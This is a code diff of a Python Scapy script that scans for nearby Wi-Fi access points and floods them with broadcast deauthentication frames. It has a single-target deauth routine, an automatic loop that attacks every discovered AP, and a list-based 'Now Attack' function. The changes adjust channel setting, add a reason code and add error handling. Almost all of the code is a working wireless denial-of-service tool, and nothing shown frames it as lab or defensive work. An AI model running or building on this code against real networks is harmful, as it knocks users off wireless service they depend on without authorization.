@@ -9,9 +9,9 @@ def channel_hopper():
         while True:
             try:
                 channel = random.randrange(1,14)
-                exe = "iw dev %s set channel %d" % ("wlan0mon", channel)
+                #exe = "iw dev %s set channel %d" % ("wlan1", channel)
+                exe = f"iwconfig wlan1 channel {channel}"
                 os.system(exe)
-                print(exe)
                 time.sleep(1)
             except KeyboardInterrupt:
                 break
@@ -29,7 +29,7 @@ class Ap:
 class Network:
     def __init__(self, interface):
         self.interface = interface
-        self.aps = {}
+        self.aps = {}   
         self.target = ""
         self.rssList = []
         self.attackAP = []
@@ -69,11 +69,12 @@ class Network:
                             rssi = -(256-ord(extra[-4:-3]))
                         except:
                             rssi = -100
-                        print(rssi)
+                        print(rssi, extra)
                         self.rssList.append(rssi)
 
     def setChannel(self, channel):
-        exe = "iw dev %s set channel %d" % (self.interface, channel)
+        #exe = "iw dev %s set channel %d" % (self.interface, channel)
+        exe = f"iwconfig {self.interface} channel {channel}"
         os.system(exe)
     def hopStop(self):
         for pro in self.processList:
@@ -86,26 +87,30 @@ class Network:
         self.processList.append(tmpProcess)
     def sniffAP(self, pkt):
         if( (pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp)) and not pkt[Dot11].addr3 in self.aps.keys()):
-            ssid       = pkt[Dot11Elt].info
-            bssid      = pkt[Dot11].addr3    
-            channel    = int( ord(pkt[Dot11Elt:3].info))
-            capability = pkt.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}\
-                    {Dot11ProbeResp:%Dot11ProbeResp.cap%}")
-            
-            # Check for encrypted networks
-            if re.search("privacy", capability): enc = 'Y'
-            else: enc  = 'N'
+            try:
+                ssid       = pkt[Dot11Elt].info
+                bssid      = pkt[Dot11].addr3    
+                channel    = int( ord(pkt[Dot11Elt:3].info))
+                capability = pkt.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}\
+                        {Dot11ProbeResp:%Dot11ProbeResp.cap%}")
+                
+                # Check for encrypted networks
+                if re.search("privacy", capability): enc = 'Y'
+                else: enc  = 'N'
 
-            # Save discovered AP
-            self.aps[pkt[Dot11].addr3] = Ap(str(ssid), str(bssid), str(channel), enc)
-
-            # Display discovered AP    
-            print ("%02d  %s  %s %s" % (int(channel), enc, bssid, ssid))
+                # Save discovered AP
+                
+                self.aps[pkt[Dot11].addr3] = Ap(ssid.decode('ascii'), str(bssid), str(channel), enc)
+                # Display discovered AP    
+                print ("%02d  %s  %s %s" % (int(channel), enc, bssid, ssid.decode('ascii')))
+            except Exception as e:
+                print(e)
+                
     def deAuth(self, apAdr, channel):
         self.setChannel(channel)
         ap = apAdr
         client = "FF:FF:FF:FF:FF:FF"
-        pkt = RadioTap() / Dot11(addr1=client, addr2=ap, addr3=ap) / Dot11Deauth()
+        pkt = RadioTap() / Dot11(addr1=client, addr2=ap, addr3=ap) / Dot11Deauth(reason=7)
         sendp(pkt, iface=self.interface, inter=0.100, loop=1, count=50)
 
     def autoDeAuth(self):
@@ -114,7 +119,7 @@ class Network:
             print("thread:",id(self.attackAP))
             for i in self.aps:
                 try:
-                    pkt = RadioTap() / Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=i.bssid, addr3=i.bssid) / Dot11Deauth()
+                    pkt = RadioTap() / Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=i.bssid, addr3=i.bssid) / Dot11Deauth(reason=7)
                     print(i, "Send Deauth Packet")
                     sendp(pkt, iface=self.interface, inter=0.1, loop=1, count=30)
                 except:
@@ -124,7 +129,7 @@ class Network:
         for ap in aplist:
             print("Now Attack:", ap['ssid'], ap['bssid'])
             self.setChannel(int(ap['channel']))
-            pkt = RadioTap() / Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=ap['bssid'], addr3=ap['bssid']) / Dot11Deauth()
+            pkt = RadioTap() / Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=ap['bssid'], addr3=ap['bssid']) / Dot11Deauth(reason=7)
             sendp(pkt, iface=self.interface, inter=0.1, loop=1, count=30)
 
 if __name__ == "__main__":
@@ -132,7 +137,7 @@ if __name__ == "__main__":
 
     # Start the channel hopper
 
-    network = Network("wlan0mon")
+    network = Network("wlan1")
     #print("set channel")
     network.hopStart()
     time.sleep(4)
